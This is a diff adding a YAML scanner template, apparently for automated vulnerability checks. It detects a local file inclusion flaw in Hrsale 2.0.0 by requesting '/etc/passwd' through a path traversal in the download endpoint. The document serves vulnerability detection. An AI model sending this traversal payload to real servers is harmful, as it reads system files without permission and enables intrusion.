@@ -1,0 +1,20 @@
+id: hrsale-unauthenticated-lfi
+brief:
+    title: Hrsale 2.0.0 - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: Hrsale 2.0.0 is vulnerable to local file inclusion. This exploit allow you to download any readable file from server without permission and login session
+    label:
+        - hrsale
+        - lfi
+        - edb
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/download?type=files&filename=../../../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
